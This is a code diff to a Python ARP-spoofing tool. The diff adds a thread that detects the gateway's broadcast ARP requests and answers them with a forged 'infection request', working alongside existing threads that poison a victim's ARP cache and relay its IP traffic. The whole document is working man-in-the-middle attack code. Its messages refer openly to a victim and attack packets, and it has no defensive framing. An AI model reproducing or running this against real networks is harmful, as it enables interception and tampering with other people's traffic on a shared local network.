@@ -1,4 +1,5 @@
 import netifaces
+import random
 import time
 import pcap
 import sys
@@ -39,6 +40,28 @@ def reply_to_request(infection_reply):
 
                 pcap_handle.sendpacket(infection_reply.as_bytes())
                 print '[<+] Sent victim attack packet'
+
+        print 'relaying ip stopped unexpectedly. restarting.'
+        pcap_handle = pcap.pcap(timeout_ms=0)
+
+
+def follow_request_of_gateway(infection_request):
+    pcap_handle = pcap.pcap(timeout_ms=0)
+    pcap_handle.setfilter('arp')
+    while True:
+        for capture in pcap_handle:
+            if capture is None:
+                continue
+            time_stamp, packet = capture
+            arp = ARP(packet)
+            if arp.operation == ARP.OP_REQUEST \
+                    and arp.ethernet.destination_mac == Ethernet.BROADCAST \
+                    and arp.sender_protocol_address == gateway_ip \
+                    and arp.sender_hardware_address == gateway_mac:
+                print "[>!] Detected gateway's arp request".format(gateway_ip)
+
+                pcap_handle.sendpacket(infection_request.as_bytes())
+                print '[<!] Sent victim infection request'
 
         print 'relaying ip stopped unexpectedly. restarting.'
         pcap_handle = pcap.pcap(timeout_ms=0)
@@ -134,12 +157,17 @@ def main():
         raise RuntimeError('Packet capture ended unexpectedly.')
 
     # attack packet
-    infection_arp = normal_reply_arp(my_mac, gateway_ip, victim_mac, victim_ip)
+    infection_reply = normal_reply_arp(my_mac, gateway_ip, victim_mac, victim_ip)
+    infection_request = normal_request_arp(my_mac, gateway_ip, my_ip)
 
-    replier = threading.Thread(target=reply_to_request, args=(infection_arp,))
-    periodical = threading.Thread(target=send_periodically, args=(infection_arp,))
+    replier = threading.Thread(target=reply_to_request, args=(infection_reply,))
+    periodical = threading.Thread(target=send_periodically, args=(infection_reply,))
+    gateway_follower = threading.Thread(target=follow_request_of_gateway, args=(infection_request,))
+
     replier.start()
     periodical.start()
+    gateway_follower.start()
+
     relay_ip()
 
 
